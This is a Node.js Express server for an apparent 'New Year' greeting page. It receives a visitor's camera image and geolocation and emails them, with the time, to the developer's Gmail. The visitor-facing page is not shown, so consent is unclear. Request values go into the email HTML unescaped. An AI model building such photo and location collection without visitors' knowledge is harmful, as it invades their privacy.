const express = require("express");
const nodemailer = require("nodemailer");
const path = require("path");
const cors = require("cors");

// Try to load .env if available (optional)
try {
  require("dotenv").config();
} catch (e) {
  // dotenv not installed — that's fine for environments that set real env vars
}

const app = express();

app.use(cors());
app.use(express.json({ limit: "25mb" }));
app.use(express.static("public"));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post("/submit", async (req, res) => {
  try {
    const { image, latitude, longitude, time } = req.body;

    if (!image) {
      return res.status(400).json({ error: "No image received" });
    }

    // Support multiple env var names for backward compatibility
    const smtpUser = process.env.SMTP_USER || process.env.MAIL_USER || "vedantdagadkhair@gmail.com";
    const smtpPass = process.env.SMTP_PASS || process.env.APP_PASS || process.env.MAIL_PASS;
    const smtpService = process.env.SMTP_SERVICE || process.env.MAIL_SERVICE || "gmail";

    let transporter;
    let usingTestAccount = false;

    if (smtpUser && smtpPass) {
      // Use provided SMTP credentials (recommended for production)
      transporter = nodemailer.createTransport({
        service: smtpService,
        auth: {
          user: smtpUser,
          pass: smtpPass
        }
      });
      console.log("Using SMTP transport with user:", smtpUser);
    } else {
      // No credentials — use Ethereal test account for local development
      console.warn("No SMTP credentials found in env. Falling back to Ethereal test account (dev only).");
      const testAccount = await nodemailer.createTestAccount();
      transporter = nodemailer.createTransport({
        host: "smtp.ethereal.email",
        port: 587,
        secure: false,
        auth: {
          user: testAccount.user,
          pass: testAccount.pass
        }
      });
      usingTestAccount = true;
      console.log("Ethereal account created. Preview messages at the URL logged after sending.");
    }

    let html = `
      <h2>🎆 New Year Visitor</h2>
      <p><b>Time:</b> ${time}</p>
      <p><b>Latitude:</b> ${latitude ?? "Not shared"}</p>
      <p><b>Longitude:</b> ${longitude ?? "Not shared"}</p>
      <br/>
      <img src="${image}" width="320"/>
    `;

    // Prepare attachments when image is a data URL (base64). Many email clients
    // block data URLs in HTML, so attach inline with a CID and reference it.
    const attachments = [];
    try {
      if (typeof image === "string" && image.startsWith("data:")) {
        const m = image.match(/^data:(.+);base64,(.+)$/);
        if (m) {
          const mime = m[1];
          const b64 = m[2];
          const ext = (mime.split("/")[1] || "png").split("+")[0];
          const cid = `photo_${Date.now()}@nodemailer`;
          attachments.push({
            filename: `visitor.${ext}`,
            content: b64,
            encoding: "base64",
            cid
          });
          // Reference the attachment inline
          html = html.replace(/<img[^>]*src="[^"]+"/, `<img src="cid:${cid}"`);
        }
      }
    } catch (e) {
      console.warn("Failed to parse image data URL:", e && e.message);
    }

    const info = await transporter.sendMail({
      from: `"New Year App" <${smtpUser}>`,
      to: smtpUser,
      subject: "🎉 New Year 2026 Visitor",
      html,
      attachments
    });

    if (usingTestAccount) {
      // For Ethereal, nodemailer provides a preview URL
      const previewUrl = nodemailer.getTestMessageUrl(info);
      console.log("Preview URL:", previewUrl);
    }

    res.json({ success: true });
  } catch (err) {
    // Helpful error message for missing credentials with common causes
    if (err && err.code === "EAUTH") {
      console.error("MAIL ERROR (authentication). Check SMTP_USER and SMTP_PASS (or APP_PASS) environment variables and Gmail app password/OAuth settings.");
    }
    console.error("MAIL ERROR:", err);
    res.status(500).json({ error: "Mail failed", details: err && err.message });
  }
});

app.listen(3000, () => {
  console.log("✅ Server running at http://localhost:3000");
});

module.exports = app;